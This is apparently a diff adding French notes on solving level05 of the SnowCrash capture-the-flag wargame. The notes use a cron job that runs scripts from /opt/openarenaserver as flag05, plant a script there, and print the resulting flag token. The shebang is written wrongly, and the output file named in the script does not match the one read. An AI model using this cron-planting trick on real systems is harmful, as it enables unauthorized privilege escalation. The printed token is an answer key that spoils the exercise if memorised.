@@ -1,1 +1,14 @@
+find / -name level05 2>/dev/null
+level05@SnowCrash:/opt/openarenaserver$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
 il faut rajouter un programme dans le dossier /opt/openarenaserver pour qu'il soit executer par le crontab en tant que flag05
+fichier a rajouter :
+
+!#/bin/bash
+getflag > answer.txt
+
+
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/b
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
